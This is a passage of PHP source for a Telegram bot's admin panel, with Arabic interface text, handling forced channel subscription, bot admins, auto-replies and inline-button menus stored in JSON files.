$shtrak["info"][$Le]['cc'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));
}

if($text and $modes[$from_id] == "set_sh"){
    $Le = $modes['helper'][$from_id];
    bot("sendmessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم حفظ الكليشه .
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'رجوع','callback_data'=>"control_$Le"]],
                        ]
                        ])
    ]);
    unset($modes[$from_id]);
    unset($modes[$from_id]['helper']);
file_put_contents("$mode_name",json_encode($modes));

$shtrak["info"][$Le]['msg'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));
}



$Le = explode("delch_",$data)[1];

if($Le){
    unset($shtrak['CHANNELS'][$Le]);
    file_put_contents("$shtrak_name",json_encode($shtrak));
    $Lr = ['inline_keyboard' => []];
    foreach ($shtrak['CHANNELS'] as $chs){
        $u = array_search($chs , $shtrak['CHANNELS']);
        if($chs != "start"){
            $Lr['inline_keyboard'][] =  [['text'=>"$chs",'callback_data'=>"control_$u"],['text'=>'🗑','callback_data'=>"delch_$u"]];
        }
        }
        $Lr['inline_keyboard'][] =  [['text'=>'اضافه قناة جديده','callback_data'=>"add_chanell"]];
        $Lr['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"shtraks"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري الثانوي ⚙️

- يمكنك وضع 5 قنوات فقط 
        
- الاشتراك سيظهر عند ضغط /start فقط لكي لا يؤثر على عمل البوت 
ستظهر قناة الاشتراك الاساسية اولا !
        
- اضغط على القناة لتعديل رساله الاشتراك الاجباري او تعين عدد المستخدمين المطلوب.
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Lr)
    ]);
}

if($data == "add_chanell"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• قم برفع البوت ادمن في قناتك او مجموعتك اولا 🌟

• من ثم ارسال معرف القناة او قم بعمل توجيه لاي منشور من قناتك الى البوت
• يمكنك وضع شتراك جباري لمجموعتك عن طريق اضافه البوت الى المجموعة وارسل 'تفعيل الاشتراك' .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($modes[$from_id] == 'add_chanell'){

    if($update->message->forward_from_chat->id){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $update->message->forward_from_chat->id, 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• تم الاضافه الي الاشتراك الاجباري .
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
        ]);
        $shtrak['CHANNELS'][] = $update->message->forward_from_chat->id;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
        deie();
    } else {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• البوت ليس ادمن !!
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
        ]);
    }
    }

    if(preg_match("/@/",$text)){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $text , 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• تم الاضافه الي الاشتراك الاجباري .
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
        ]);
        $shtrak['CHANNELS'][] = $text;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
        file_put_contents("$mode_name",json_encode($modes));
        die();
    }else{
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• البوت ليس ادمن !!
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
        ]);
    }
    }
if($text == "تفعيل الاشتراك"){
    if(preg_match("/-/",$text)){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $chat_id , 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
• تم الاضافه الي الاشتراك الاجباري .
                ",
                'parse_mode' => 'MaRKDOWN',
                                'reply_to_message_id' => $message_id,
                                 
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
            ]);
            $shtrak['CHANNELS'][] = $chat_id;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
        file_put_contents("$mode_name",json_encode($modes));
        }else{
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
• البوت ليس ادمنا في القروب !
                ",
                'parse_mode' => 'MaRKDOWN',
                                'reply_to_message_id' => $message_id,
                                 
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"second_ch"]],
	]
	])
            ]);
        }
    }
}

}


if($data == 'shmsg'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل كليشه الاشتراك الان
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'الرجوع للكليشه الاساسيه','callback_data'=>"msgdefault"]],
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($data == 'msgdefault'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم الرجوع الى الكليشه الاساسيه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
    ]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));

    unset($shtrak['MSG_CHANNEL_ASAS']);
    file_put_contents("$shtrak_name",json_encode($shtrak));
}


if($text and $modes[$from_id] == 'shmsg'){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
                         
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
    [['text'=>'رجوع','callback_data'=>"shtraks"]],
]
])
    ]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));

    $shtrak['MSG_CHANNEL_ASAS'] = $text;
    file_put_contents("$shtrak_name",json_encode($shtrak));
}

//الملف كتابه بيرو  @v44vv - @Sero_Bots

if($data == 'delch'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم مسح وتعطيل الاشتراك الاجباري !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
    ]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));

    unset($shtrak['CHANNEL_ASAS']);
    file_put_contents("$shtrak_name",json_encode($shtrak));
}

if($data == 'sestch'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• قم برفع البوت ادمن في قناتك او مجموعتك اولا 🌟

• من ثم ارسال معرف القناة او قم بعمل توجيه لاي منشور من قناتك الى البوت
• يمكنك وضع شتراك جباري لمجموعتك عن طريق اضافه البوت الى المجموعة وارسل 'تفعيل الاشتراك' .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($modes[$from_id] == 'sestch'){

    if($update->message->forward_from_chat->id){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $update->message->forward_from_chat->id, 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• تم الاضافه الي الاشتراك الاجباري .
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
        ]);
        $shtrak['CHANNEL_ASAS'] = $update->message->forward_from_chat->id;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
        deie();
    } else {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• البوت ليس ادمن !!
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
        ]);
    }
    }

    if(preg_match("/@/",$text)){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $text , 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• تم الاضافه الي الاشتراك الاجباري .
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
        ]);
        $shtrak['CHANNEL_ASAS'] = $text;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
        file_put_contents("$mode_name",json_encode($modes));
        die();
    }else{
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• البوت ليس ادمن !!
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                             
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
        ]);
    }
    }
if($text == "تفعيل الاشتراك"){
    if(preg_match("/-/",$text)){
        $getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => $chat_id , 'user_id' => IDBot]));
        $getChatMemberRes = json_decode($getChatMemberReq, true);
        if ($getChatMemberRes['result']['status'] == "administrator") {
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
• تم الاضافه الي الاشتراك الاجباري .
                ",
                'parse_mode' => 'MaRKDOWN',
                                'reply_to_message_id' => $message_id,
                                 
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
            ]);
            $shtrak['CHANNEL_ASAS'] = $chat_id;
        file_put_contents("$shtrak_name",json_encode($shtrak));

        unset($modes[$from_id]);
        file_put_contents("$mode_name",json_encode($modes));
        }else{
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
• البوت ليس ادمنا في القروب !
                ",
                'parse_mode' => 'MaRKDOWN',
                                'reply_to_message_id' => $message_id,
                                 
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"shtraks"]],
	]
	])
            ]);
        }
    }
}

}

$task_ex = explode("shtrak_",$data)[1];
if($task_ex){
    $Y = $shtrak[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $shtrak[$task_ex] = $t;
    file_put_contents("$shtrak_name",json_encode($shtrak));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري 💫

- قناة الاشتراك الاساسية : `$ch_shtrak`
- رساله الاشتراك الاساسية : `$msg_shtrak`
        
- وضع الاداء : يقوم بتحقق من اشتراك الشخص في رساله /start فقط 
- يمكنك تعين نوع الاشتراك الاجباري من خلال الضغط 'نوع الاشتراك الاجباري'
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        
        [['text'=>'تعيين القناة','callback_data'=>"sestch"],['text'=>'مسح القناة','callback_data'=>"delch"]],
        [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"shmsg"]],
        [['text'=>'وضع الاداء : ' . $shtrak["start"],'callback_data'=>"shtrak_start"],['text'=>'اشعار الاشتراك : ' . $shtrak["notife"],'callback_data'=>"shtrak_notife"]],
        [['text'=>'ازرار شفافه : ' . $shtrak["inline"],'callback_data'=>"shtrak_inline"],['text'=>'ماركداون : ' . $shtrak["markdown"],'callback_data'=>"shtrak_markdown"]],
        [['text'=>'زر التحقق من الاشتراك : ' . $shtrak["check"],'callback_data'=>"shtrak_check"]],
        [['text'=>'قسم الاشتراك الثانوي','callback_data'=>"second_ch"]],
        [['text'=>'نوع الاشتراك الاجباري : قناة تيليكرام','callback_data'=>"strak_1"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);

}


if($chat_id == $admin){
if($data == "admins_bot"){

    foreach ($admins as $h){
        $n = array_search($h,$admins);
        if($h != "75"){
        $Br['inline_keyboard'][] =  [['text'=>"$h",'callback_data'=>"cnull"],['text'=>'🗑','callback_data'=>"delad_$n"]];
        }
    }

    $Br['inline_keyboard'][] =   [['text'=>'اضافه ادمن جديد','callback_data'=>"add_admin"]];
    $Br['inline_keyboard'][] =   [['text'=>'رجوع','callback_data'=>"paneel"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في الادمنيه 👮‍♀️
- يمكنك رفع 5 ادمنيه في البوت او حذفهم 
        
- يمكن للادمنيه تحكم في لوحه البوت مثلك ولا يمكنهم رفع ادمنيه او استلام رسائل الموجهة او سايت او تواصل .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Br)
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}

$task_ex = explode("delad_",$data)[1];
if(explode("delad_",$data)[1]){

    unset($admins[$task_ex]);
    
    file_put_contents("$admin_name",json_encode($admins));
    $Br = ['inline_keyboard' => []];
    foreach ($admins as $h){
        $n = array_search($h,$admins);
        if($h != "75"){
            $Br['inline_keyboard'][] =  [['text'=>"$h",'callback_data'=>"cnull"],['text'=>'🗑','callback_data'=>"delad_$n"]];
            }
    }

    $Br['inline_keyboard'][] =   [['text'=>'اضافه ادمن جديد','callback_data'=>"add_admin"]];
    $Br['inline_keyboard'][] =   [['text'=>'رجوع','callback_data'=>"paneel"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في الادمنيه 👮‍♀️
- يمكنك رفع 5 ادمنيه في البوت او حذفهم 
        
- يمكن للادمنيه تحكم في لوحه البوت مثلك ولا يمكنهم رفع ادمنيه او استلام رسائل الموجهة او سايت او تواصل .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Br)
    ]);
}

if($data == 'add_admin'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل ايدي الشخص الان او معرف الشخص !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"admins_bot"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($modes[$from_id] == 'add_admin'){
    if(preg_match("/@/",$text) or is_numeric($text)){
        bot("sendmessage",[
            'chat_id' => $chat_id,
            'text' => "
• تم الاضافه الى الادمنيه بنجاح
            ",
            'parse_mode' => 'MaRKDOWN',
                            'reply_to_message_id' => $message_id,
                               
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"admins_bot"]],
	]
	])
        ]);

        $admins[] = $text;
        file_put_contents("$admin_name",json_encode($admins));

        unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));

    }
}
}
$task_ex = explode("inford_",$data)[1];
if($task_ex){
    $tec = $rdod['msg'][$task_ex];
    $rd = $rdod['reply'][$tec];
    if($rd != null){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
الكلمه : $tec
الرد : $rd
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'توقف البوت بعد الرد : ' . $rdod["setting"][$tec]["STOP"],'callback_data'=>"rdset|".$task_ex."_STOP"]],
            [['text'=>'حساسيه الرد : ' .  $rdod["setting"][$tec]["preg"],'callback_data'=>"rdset|".$task_ex."_preg"]],
        ]
        ])
    ]);
}
}



$task_ex = explode("delrd_",$data)[1];
if($task_ex){
    $r = $task_ex;
    unset($rdod["setting"][$rdod['reply'][$rdod['msg'][$r]]]);
    unset($rdod['reply'][$rdod['msg'][$r]]);
    unset($rdod['msg'][$r]);
    file_put_contents("$rdod_name",json_encode($rdod));

    $Ks = ['inline_keyboard' => []];
    foreach($rdod['msg'] as $d){
        $co = array_search($d,$rdod['msg']);

    $Ks['inline_keyboard'][] =  [['text'=>"$d",'callback_data'=>"inford_$co"],['text'=>'🗑','callback_data'=>"delrd_$co"]];
    }
    $Ks['inline_keyboard'][] =  [['text'=>'اضافه رد جديد','callback_data'=>"addrd"],['text'=>'الردود : '. $rdod['stat'],'callback_data'=>"rdod_stat"]];
    $Ks['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"paneel"]];

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الردود 👮‍♀️

- يمكنك اضافه ردود وحذفها 
- يمكنك استخدام الاوامر (اضف رد-مسح رد) 
        
- اضغط على نص الزر لعرض محتواه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Ks)
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));
die();
}

$task_ex = explode("rdset|",$data)[1];
if($task_ex){
    $dat = explode("_",$task_ex);
    $tecs = $dat[1];
    $m = $dat[0];
    $tec = $rdod['msg'][$m];
    $rd = $rdod['reply'][$tec];
    if($rd != null){
    $Y = $rdod["setting"][$tec][$tecs];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $rdod["setting"][$tec][$tecs] = $t;
    file_put_contents("$rdod_name",json_encode($rdod));

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id" => $message_id,
        'text' => "
الكلمه : $tec
الرد : $rd
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'توقف البوت بعد الرد : ' . $rdod["setting"][$tec]["STOP"],'callback_data'=>"rdset|".$m."_STOP"]],
            [['text'=>'حساسيه الرد : ' .  $rdod["setting"][$tec]["preg"],'callback_data'=>"rdset|".$m."_preg"]],
        ]
        ])
    ]);
    unset($modes[$from_id]);
    unset($modes['rd'][$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
    die();
    }
}

if($data == "rdod"){
    $Ks = ['inline_keyboard' => []];
    foreach($rdod['msg'] as $d){
        $co = array_search($d,$rdod['msg']);

    $Ks['inline_keyboard'][] =  [['text'=>"$d",'callback_data'=>"inford_$co"],['text'=>'🗑','callback_data'=>"delrd_$co"]];
    }
    $Ks['inline_keyboard'][] =  [['text'=>'اضافه رد جديد','callback_data'=>"addrd"],['text'=>'الردود : '. $rdod['stat'],'callback_data'=>"rdod_stat"]];
    $Ks['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"paneel"]];

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الردود 👮‍♀️

- يمكنك اضافه ردود وحذفها 
- يمكنك استخدام الاوامر (اضف رد-مسح رد) 
        
- اضغط على نص الزر لعرض محتواه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Ks)
    ]);
    unset($modes[$from_id]);
    unset($modes['rd'][$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
    die();
}

if($text == "مشاهدة الازرار" or $text == 'مشاهده الازرار'){
foreach ($update->message->reply_to_message->reply_markup->inline_keyboard as $row) {
    foreach ($row as $button) {
        if (isset($button->text)) {
            $r = $button->text;
            $dat = $button->callback_data;
            $dat = "`bero:". base64_encode($dat)."`";
            $tm = $tm ."\n *$r* -> $dat";
        }
    }
}

    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "".$tm."\n\n الكودات الخاصه بالزرار ✅",
        'parse_mode' => 'markdown',
                    'reply_to_message_id' => $message_id,
    
    ]);
    die();
}
if($data == "addrd"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل الكلمة الان .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"rdod"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($text and $modes[$from_id] == "addrd"){
bot("sendmessage",[
    'chat_id' => $chat_id,
    'text' => "
• ارسل الرد الان 

- يمكنك وضع بعض الاضافات الى الرد من خلال استخدام الاهاشتاكات التاليه :
[
1. #id : لوضع ايدي الشخص 
2. #username : لوضع اسم مستخدم الشخص مع اضافه @ 
3. #name : لوضع اسم الشخص
]
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"rdod"]],
	]
	])
]);
$modes[$from_id] = "rd2";
$modes['rd'][$from_id] = "$text";
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($text and $modes[$from_id] == "rd2"){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
- تم حفط الرد بنجاح
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'اضافه رد جديد','callback_data'=>"addrd"]],
            [['text'=>'رجوع','callback_data'=>"rdod"]],
        ]
        ])
    ]);
$rdod["setting"][$modes['rd'][$from_id]]["STOP"] = "✅";
$rdod["setting"][$modes['rd'][$from_id]]["preg"] = "❌";
$rdod["msg"][] = $modes['rd'][$from_id];
$rdod['reply'][$modes['rd'][$from_id]] = $text;
file_put_contents("$rdod_name",json_encode($rdod));
unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}


$id = $update->inline_query->from->id; 
$rr = rand(0,99999999);

$k[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"azrars"]];
$k1[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"back1"]];

	

    

    
$task_ex = explode("izr_sock_",$data)[1];
if($task_ex){
    $Y = $izr_sock[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $izr_sock[$task_ex] = $t;
    file_put_contents("$izr_name",json_encode($izr_sock));
    $key=[];
    $key['inline_keyboard'][]=[['text'=>"الخدمات 🗂",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"تجميع ✳️",'callback_data'=>"llkn"], ['text'=>"الحساب 🗃",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"استخدام كود 💳",'callback_data'=>"hdia"], ['text'=>"تحويل $name3mla ♻️",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"معلومات الطلب 📥",'callback_data'=>"infotlb"],['text'=>"طلباتي 📮",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"قناة البوت 🤍",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"شحن $name3mla 💰",'callback_data'=>"llkn"],['text'=>"الشروط 📜",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"عدد الطلبات : $bot_tlb ✅",'callback_data'=>"llkn"]];
    $addedIds = [];

    foreach ($zr['id'] as $i) {
        $name = $zr['infonam'][$i];
        $biozr = $zr['infodesc'][$i];

        if (preg_match("#http#", $biozr)) {
            $editButton = ['text' => "$name", 'callback_data' => "edit:$i"];
            $deleteButton = ['text' => "🗑️", 'callback_data' => "del:$i"];

            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [$editButton, $deleteButton];
                $addedIds[] = $i;
            }
        } else {
            if (!in_array($i, $addedIds)) {
                $key['inline_keyboard'][] = [['text' => "$name", 'callback_data' => "edit:$i"]];
                $addedIds[] = $i;
            }
        }
    }

    $key['inline_keyboard'][] = [['text' => "+", 'callback_data' => "newzr"]];
    $key['inline_keyboard'][] =  [['text' => "تعديل ألأزرار", 'callback_data' => "azrarsb"],['text' => "الأزرار ألاساسيه : ".$izr_sock['mode']."", 'callback_data' => "izr_sock_mode"]];
    $key['inline_keyboard'][] = [['text' => 'رجوع', 'callback_data' => "paneel"]];

    bot('editmessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*• مرحبا بك في قسم الازرار الشفافة ✨*

- يمكنك اضافه ازرار شفافة او حذفها ( لا يمكنك حذف الازرار الاساسية ولاكن يمكنك تعديلها من قسم تعديل الازرار )",
        'parse_mode' => "MARKDOWN",
        'disable_web_page_preview' => "true",
        'disable_notification' => false,
        'reply_markup' => json_encode(['inline_keyboard' => $key['inline_keyboard']])
    ]);

    $zr['modemr'] = null;
    $zr['mode'] = null;
    $zr = json_encode($zr, true);
    file_put_contents("FCZR/" . X_ . "/zr.json", $zr);

}
    

if ($data == "azrars") {
    $key=[];
    $key['inline_keyboard'][]=[['text'=>"الخدمات 🗂",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"تجميع ✳️",'callback_data'=>"llkn"], ['text'=>"الحساب 🗃",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"استخدام كود 💳",'callback_data'=>"hdia"], ['text'=>"تحويل $name3mla ♻️",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"معلومات الطلب 📥",'callback_data'=>"infotlb"],['text'=>"طلباتي 📮",'callback_data'=>"llkn"]];
    $key['inline_keyboard'][]=[['text'=>"قناة البوت 🤍",'callback_data'=>"llkn"]];
